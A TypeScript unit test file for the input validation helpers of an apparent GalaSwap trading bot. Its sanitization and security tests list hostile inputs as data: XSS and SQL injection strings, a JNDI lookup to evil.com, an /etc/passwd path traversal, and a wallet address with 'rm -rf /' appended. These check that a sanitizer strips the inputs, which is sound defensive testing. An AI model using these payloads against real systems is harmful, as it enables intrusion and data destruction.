/**
 * Validation Utils Tests
 * Unit tests for input validation utilities
 */

import {
  validateWalletAddress,
  validateTokenAmount,
  validateConfiguration,
  validateEnvironmentVariables,
  validateTradingParameters,
  sanitizeInput,
  validatePrivateKey,
  validateSlippageTolerance,
  validateFeeTier
} from '../../utils/validation';
import TestHelpers from '../utils/test-helpers';

describe('Validation Utils', () => {
  describe('wallet address validation', () => {
    it('should validate correct wallet address formats', () => {
      const validAddresses = [
        'client|0x1234567890123456789012345678901234567890',
        'client|0xAbCdEf1234567890123456789012345678901234',
        '0x1234567890123456789012345678901234567890'
      ];

      validAddresses.forEach(address => {
        expect(validateWalletAddress(address)).toBe(true);
      });
    });

    it('should reject invalid wallet addresses', () => {
      const invalidAddresses = [
        '',
        null,
        undefined,
        '0x123', // too short
        'invalid-format',
        'client|invalid',
        '0xGGGG567890123456789012345678901234567890' // invalid hex
      ];

      invalidAddresses.forEach(address => {
        expect(validateWalletAddress(address)).toBe(false);
      });
    });

    it('should handle edge cases', () => {
      expect(validateWalletAddress('client|')).toBe(false);
      expect(validateWalletAddress('0x')).toBe(false);
      expect(validateWalletAddress('0x' + '0'.repeat(40))).toBe(true);
      expect(validateWalletAddress('client|0x' + 'F'.repeat(40))).toBe(true);
    });
  });

  describe('token amount validation', () => {
    it('should validate positive amounts', () => {
      const validAmounts = [
        '1',
        '0.1',
        '1000',
        '0.000001',
        '1.23456789'
      ];

      validAmounts.forEach(amount => {
        expect(validateTokenAmount(amount)).toBe(true);
      });
    });

    it('should reject invalid amounts', () => {
      const invalidAmounts = [
        '',
        null,
        undefined,
        '0',
        '-1',
        'abc',
        'NaN',
        'Infinity',
        '1.2.3'
      ];

      invalidAmounts.forEach(amount => {
        expect(validateTokenAmount(amount)).toBe(false);
      });
    });

    it('should handle precision limits', () => {
      expect(validateTokenAmount('0.000000000001')).toBe(true);
      expect(validateTokenAmount('999999999999')).toBe(true);
      expect(validateTokenAmount('1e-18')).toBe(true);
      expect(validateTokenAmount('1e18')).toBe(true);
    });

    it('should validate numeric amounts', () => {
      expect(validateTokenAmount(1)).toBe(true);
      expect(validateTokenAmount(0.1)).toBe(true);
      expect(validateTokenAmount(0)).toBe(false);
      expect(validateTokenAmount(-1)).toBe(false);
    });
  });

  describe('private key validation', () => {
    it('should validate correct private key formats', () => {
      const validKeys = [
        '0123456789012345678901234567890123456789012345678901234567890123',
        '0x0123456789012345678901234567890123456789012345678901234567890123',
        'ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789'
      ];

      validKeys.forEach(key => {
        expect(validatePrivateKey(key)).toBe(true);
      });
    });

    it('should reject invalid private keys', () => {
      const invalidKeys = [
        '',
        null,
        undefined,
        '123', // too short
        '0x123', // too short
        'GGGG456789012345678901234567890123456789012345678901234567890123' // invalid hex
      ];

      invalidKeys.forEach(key => {
        expect(validatePrivateKey(key)).toBe(false);
      });
    });
  });

  describe('slippage tolerance validation', () => {
    it('should validate reasonable slippage values', () => {
      const validSlippages = [0.001, 0.01, 0.05, 0.1];

      validSlippages.forEach(slippage => {
        expect(validateSlippageTolerance(slippage)).toBe(true);
      });
    });

    it('should reject invalid slippage values', () => {
      const invalidSlippages = [-0.01, 0, 0.51, 1.1, NaN, Infinity];

      invalidSlippages.forEach(slippage => {
        expect(validateSlippageTolerance(slippage)).toBe(false);
      });
    });

    it('should handle edge cases', () => {
      expect(validateSlippageTolerance(0.0001)).toBe(true); // 0.01%
      expect(validateSlippageTolerance(0.5)).toBe(true); // 50% (maximum)
      expect(validateSlippageTolerance(0.50001)).toBe(false); // just over max
    });
  });

  describe('fee tier validation', () => {
    it('should validate supported fee tiers', () => {
      const validFeeTiers = [100, 500, 3000, 10000];

      validFeeTiers.forEach(fee => {
        expect(validateFeeTier(fee)).toBe(true);
      });
    });

    it('should reject unsupported fee tiers', () => {
      const invalidFeeTiers = [0, 50, 1000, 5000, 20000, -100];

      invalidFeeTiers.forEach(fee => {
        expect(validateFeeTier(fee)).toBe(false);
      });
    });
  });

  describe('configuration validation', () => {
    it('should validate complete bot configuration', () => {
      const validConfig = TestHelpers.createTestBotConfig();
      const result = validateConfiguration(validConfig);

      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should detect missing required fields', () => {
      const incompleteConfig = {
        api: { baseUrl: 'http://test.com' },
        // missing wallet and trading config
      };

      const result = validateConfiguration(incompleteConfig);
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.errors.some(e => e.includes('wallet'))).toBe(true);
    });

    it('should validate nested configuration objects', () => {
      const configWithInvalidNested = {
        api: {
          baseUrl: 'invalid-url',
          wsUrl: 'invalid-ws-url'
        },
        wallet: {
          address: 'invalid-address',
          privateKey: 'invalid-key'
        },
        trading: {
          maxPositionSize: -1, // invalid negative
          maxSlippage: 1.5 // invalid > 1
        }
      };

      const result = validateConfiguration(configWithInvalidNested);
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(3);
    });

    it('should provide specific error messages', () => {
      const invalidConfig = {
        api: { baseUrl: '' },
        wallet: { address: '', privateKey: '' },
        trading: { maxPositionSize: 0 }
      };

      const result = validateConfiguration(invalidConfig);
      expect(result.errors.some(e => e.includes('baseUrl'))).toBe(true);
      expect(result.errors.some(e => e.includes('address'))).toBe(true);
      expect(result.errors.some(e => e.includes('privateKey'))).toBe(true);
      expect(result.errors.some(e => e.includes('maxPositionSize'))).toBe(true);
    });
  });

  describe('environment variables validation', () => {
    let originalEnv: NodeJS.ProcessEnv;

    beforeEach(() => {
      originalEnv = { ...process.env };
    });

    afterEach(() => {
      process.env = originalEnv;
    });

    it('should validate required environment variables', () => {
      process.env.WALLET_ADDRESS = 'client|0x1234567890123456789012345678901234567890';
      process.env.WALLET_PRIVATE_KEY = '0123456789012345678901234567890123456789012345678901234567890123';
      process.env.GALASWAP_API_URL = 'https://api.galaswap.com';
      process.env.GALASWAP_WS_URL = 'wss://ws.galaswap.com';

      const result = validateEnvironmentVariables();
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should detect missing environment variables', () => {
      delete process.env.WALLET_ADDRESS;
      delete process.env.WALLET_PRIVATE_KEY;

      const result = validateEnvironmentVariables();
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('WALLET_ADDRESS'))).toBe(true);
      expect(result.errors.some(e => e.includes('WALLET_PRIVATE_KEY'))).toBe(true);
    });

    it('should validate environment variable formats', () => {
      process.env.WALLET_ADDRESS = 'invalid';
      process.env.WALLET_PRIVATE_KEY = 'invalid';
      process.env.GALASWAP_API_URL = 'not-a-url';

      const result = validateEnvironmentVariables();
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(2);
    });
  });

  describe('trading parameters validation', () => {
    it('should validate complete trading parameters', () => {
      const validParams = {
        tokenIn: 'GALA',
        tokenOut: 'USDC',
        amountIn: '1000',
        fee: 3000,
        slippageTolerance: 0.01,
        deadline: Date.now() + 300000 // 5 minutes
      };

      const result = validateTradingParameters(validParams);
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject invalid trading parameters', () => {
      const invalidParams = {
        tokenIn: '', // empty
        tokenOut: '', // empty
        amountIn: '0', // zero amount
        fee: 1000, // unsupported fee
        slippageTolerance: 0.6, // too high
        deadline: Date.now() - 1000 // past deadline
      };

      const result = validateTradingParameters(invalidParams);
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(5);
    });

    it('should validate token symbols', () => {
      const paramsWithInvalidTokens = {
        tokenIn: 'INVALID_TOKEN_123',
        tokenOut: 'ANOTHER_INVALID',
        amountIn: '1000',
        fee: 3000
      };

      const result = validateTradingParameters(paramsWithInvalidTokens);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('tokenIn'))).toBe(true);
      expect(result.errors.some(e => e.includes('tokenOut'))).toBe(true);
    });

    it('should validate deadline is in the future', () => {
      const paramsWithPastDeadline = {
        tokenIn: 'GALA',
        tokenOut: 'USDC',
        amountIn: '1000',
        fee: 3000,
        deadline: Date.now() - 60000 // 1 minute ago
      };

      const result = validateTradingParameters(paramsWithPastDeadline);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('deadline'))).toBe(true);
    });
  });

  describe('input sanitization', () => {
    it('should sanitize string inputs', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'DROP TABLE users;',
        '${jndi:ldap://evil.com}',
        '../../../etc/passwd'
      ];

      maliciousInputs.forEach(input => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('DROP TABLE');
        expect(sanitized).not.toContain('${jndi');
        expect(sanitized).not.toContain('../');
      });
    });

    it('should preserve safe inputs', () => {
      const safeInputs = [
        'GALA',
        'USDC',
        '1000.5',
        'client|0x1234567890123456789012345678901234567890'
      ];

      safeInputs.forEach(input => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).toBe(input);
      });
    });

    it('should handle null and undefined inputs', () => {
      expect(sanitizeInput(null)).toBe('');
      expect(sanitizeInput(undefined)).toBe('');
      expect(sanitizeInput('')).toBe('');
    });

    it('should limit input length', () => {
      const longInput = 'a'.repeat(10000);
      const sanitized = sanitizeInput(longInput);
      expect(sanitized.length).toBeLessThanOrEqual(1000); // Assuming 1000 char limit
    });
  });

  describe('validation performance', () => {
    it('should validate addresses quickly', () => {
      const address = 'client|0x1234567890123456789012345678901234567890';
      const iterations = 10000;

      const startTime = Date.now();
      for (let i = 0; i < iterations; i++) {
        validateWalletAddress(address);
      }
      const endTime = Date.now();

      const timePerValidation = (endTime - startTime) / iterations;
      expect(timePerValidation).toBeLessThan(1); // Should be sub-millisecond
    });

    it('should validate configurations efficiently', () => {
      const config = TestHelpers.createTestBotConfig();
      const iterations = 1000;

      const startTime = Date.now();
      for (let i = 0; i < iterations; i++) {
        validateConfiguration(config);
      }
      const endTime = Date.now();

      const timePerValidation = (endTime - startTime) / iterations;
      expect(timePerValidation).toBeLessThan(10); // Should be fast
    });
  });

  describe('error handling', () => {
    it('should handle validation errors gracefully', () => {
      // Test with objects that might cause errors
      const problematicInputs = [
        { circular: {} },
        new Date(),
        Buffer.from('test'),
        Symbol('test')
      ];

      // Add circular reference
      problematicInputs[0].circular = problematicInputs[0];

      problematicInputs.forEach(input => {
        expect(() => {
          validateConfiguration(input as any);
        }).not.toThrow();
      });
    });

    it('should provide meaningful error messages', () => {
      const invalidConfig = {
        api: { baseUrl: 'invalid' },
        wallet: { address: 'invalid' }
      };

      const result = validateConfiguration(invalidConfig);
      expect(result.isValid).toBe(false);
      result.errors.forEach(error => {
        expect(typeof error).toBe('string');
        expect(error.length).toBeGreaterThan(10);
        expect(error).toMatch(/[a-zA-Z]/);
      });
    });
  });

  describe('security validation', () => {
    it('should detect potential security issues', () => {
      const securityTestCases = [
        {
          input: 'client|0x1234567890123456789012345678901234567890; rm -rf /',
          shouldPass: false
        },
        {
          input: 'GALA\x00\x01',
          shouldPass: false
        },
        {
          input: 'normal_token_name',
          shouldPass: true
        }
      ];

      securityTestCases.forEach(({ input, shouldPass }) => {
        const sanitized = sanitizeInput(input);
        if (shouldPass) {
          expect(sanitized).toBe(input);
        } else {
          expect(sanitized).not.toBe(input);
        }
      });
    });

    it('should validate against common injection patterns', () => {
      const injectionPatterns = [
        "'; DROP TABLE --",
        "<img src=x onerror=alert(1)>",
        "{{7*7}}",
        "${7*7}",
        "%7B%7B7*7%7D%7D"
      ];

      injectionPatterns.forEach(pattern => {
        const sanitized = sanitizeInput(pattern);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('DROP TABLE');
        expect(sanitized).not.toContain('{{');
        expect(sanitized).not.toContain('${');
      });
    });
  });
});